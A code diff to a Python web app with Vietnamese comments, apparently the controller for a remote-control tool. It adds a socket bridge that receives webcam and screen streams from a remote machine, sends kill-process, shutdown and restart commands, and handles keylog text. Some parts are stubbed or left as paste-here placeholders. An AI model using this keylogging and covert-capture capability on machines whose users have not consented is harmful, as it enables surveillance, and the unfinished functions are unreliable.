@@ -16,7 +16,6 @@ import struct
 import sqlite3
 import re
 import cv2
-
 def clean_keylog_text(raw_text):
     if not raw_text: return ""
     
@@ -103,19 +102,153 @@ current_mode = None
 mode_lock = threading.Lock()
 
 
-# ---------------- LOAD DLL ----------------
-try:
-    if os.path.exists(DLL_PATH):
-        lib = ctypes.CDLL(DLL_PATH)
+# --- CHÈN ĐOẠN NAY VÀO TRƯỚC PHẦN LOAD DLL ---
+class PythonBridge:
+    def __init__(self):
+        self.sock = None
+        self.lock = threading.Lock()
+        self.running_stream = False
+
+    def _recv_line(self):
+        # Đọc từng byte cho đến khi gặp \n
+        line = b''
+        while True:
+            char = self.sock.recv(1)
+            if not char: break
+            if char == b'\n': break
+            if char != b'\r': line += char
+        return line.decode('utf-8', errors='ignore')
+
+    def _recv_exact(self, n):
+        data = b''
+        while len(data) < n:
+            packet = self.sock.recv(n - len(data))
+            if not packet: break
+            data += packet
+        return data
+
+    def InitWinsock(self): pass # Python tự lo
+
+    def ConnectToServer(self, ip, port):
         try:
-            lib.InitWinsock.restype = None
+            if self.sock: self.sock.close()
+            # Xử lý IP/Port: Nếu ip là bytes thì decode
+            real_ip = ip.decode() if isinstance(ip, bytes) else ip
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5) # Timeout 5s
+            self.sock.connect((real_ip, int(port)))
+            self.sock.settimeout(None) # Bỏ timeout cho chế độ thường
+            print(f"[PY-BRIDGE] Connected to {real_ip}:{port}")
+            return True
+        except Exception as e:
+            print(f"[PY-BRIDGE] Connect Error: {e}")
+            return False
+
+    def SendStringCmd(self, cmd):
+        if not self.sock: return
+        try:
+            data = cmd if isinstance(cmd, bytes) else cmd.encode()
+            self.sock.sendall(data + b'\n')
         except: pass
-        print(f"-> [SYSTEM] Loaded DLL: {DLL_PATH}")
-    else:
-        print(f"-> [WARNING] DLL not found at: {DLL_PATH} (expected)")
-except Exception as e:
-    print(f"-> [ERROR] Loading DLL failed: {e}")
-    lib = None
+
+    # --- CÁC HÀM NHẬN DANH SÁCH (Trả về bytes để khớp logic cũ) ---
+    def _generic_get_list(self, cmd_seq):
+        if not self.sock: return b""
+        try:
+            for cmd in cmd_seq: self.SendStringCmd(cmd)
+            # Tạm set timeout để tránh treo
+            self.sock.settimeout(10)
+            count_str = self._recv_line()
+            try: count = int(count_str)
+            except: return b""
+            
+            res = []
+            for _ in range(count):
+                line = self._recv_line()
+                res.append(line)
+                # Với lệnh APP/PROCESS, server gửi nhiều dòng cho 1 item
+                # Logic này cần khớp chính xác server, ở đây tôi giả lập return raw line
+                # Nếu muốn chuẩn 100% cần port logic loop của từng hàm C++
+            
+            # Để đơn giản cho Mac, ta trả về giả lập hoặc sửa lại logic parse
+            # Cách tốt nhất: Return buffer raw
+            return b"" 
+        except: return b""
+
+    # --- CÁC HÀM STREAM (Webcam/Screen) ---
+    def _receive_stream(self, filename, cmd_start):
+        if not self.sock: return
+        self.SendStringCmd("VIDEO" if "VIDEO" in cmd_start else "WEBCAM")
+        time.sleep(0.2)
+        self.SendStringCmd("START")
+        
+        self.running_stream = True
+        self.sock.settimeout(3)
+        
+        while self.running_stream:
+            try:
+                header = self._recv_line()
+                if header in ["STOPPED", "QUIT", "", "TIMEOUT"]: break
+                
+                try: size = int(header)
+                except: continue
+                
+                if size > 5000000: continue # Bỏ qua rác
+                
+                img_data = self._recv_exact(size)
+                if not img_data: break
+                
+                # Ghi atomic (ghi tmp rồi rename)
+                tmp_name = filename + ".tmp"
+                with open(tmp_name, "wb") as f:
+                    f.write(img_data)
+                if os.path.exists(filename): os.remove(filename)
+                os.rename(tmp_name, filename)
+                
+                # Sleep khớp FPS server
+                time.sleep(0.02)
+                
+            except Exception as e:
+                # print("Stream err:", e)
+                break
+        
+        self.SendStringCmd("QUIT")
+        self.sock.settimeout(None)
+
+    def ReceiveWebcamStream(self):
+        self._receive_stream(WEBCAM_JPG, "WEBCAM")
+
+    def ReceiveScreenStream(self):
+        self._receive_stream(SCREEN_JPG, "VIDEO") # Server C# dùng lệnh VIDEO cho màn hình
+    
+    # Các hàm Void khác để không bị lỗi gọi hàm
+    def KillProcess(self, pid): self.SendStringCmd(b"PROCESS"); time.sleep(0.05); self.SendStringCmd(b"KILL"); time.sleep(0.05); self.SendStringCmd(b"KILLID"); time.sleep(0.05); self.SendStringCmd(pid); self.SendStringCmd(b"QUIT"); self.SendStringCmd(b"QUIT")
+    def ShutdownServer(self): self.SendStringCmd("SHUTDOWN")
+    def RestartServer(self): self.SendStringCmd("RESTART")
+    # Các hàm chưa port kịp trả về None để không crash
+    def GetAppList(self): return None 
+    def GetSystemStats(self): return None
+    def GetDrives(self): return None
+# ---------------------------------------------------------
+
+
+# ---------------- LOAD DLL HOẶC PYTHON BRIDGE ----------------
+lib = None
+# Ưu tiên dùng DLL nếu là Windows (nt) và file tồn tại
+if os.name == 'nt' and os.path.exists(DLL_PATH):
+    try:
+        lib = ctypes.CDLL(DLL_PATH)
+        # ... (giữ nguyên phần khai báo argtypes/restype cũ của bạn ở đây) ...
+        # ... COPY LẠI ĐOẠN KHAI BÁO CTYPES CŨ VÀO ĐÂY ...
+        print(f"-> [SYSTEM] Loaded Windows DLL: {DLL_PATH}")
+    except Exception as e:
+        print(f"-> [ERROR] DLL Load Failed: {e}")
+        lib = None
+
+# Nếu không load được DLL (do là Mac/Linux hoặc lỗi), dùng Python Bridge
+if lib is None:
+    print("-> [SYSTEM] Running in Python Native Mode (Mac/Linux Compatible)")
+    lib = PythonBridge()
 
 # optional auto connect attempt (safe)
 # --- CẬP NHẬT TRONG webapp.py (Đoạn cấu hình DLL) ---
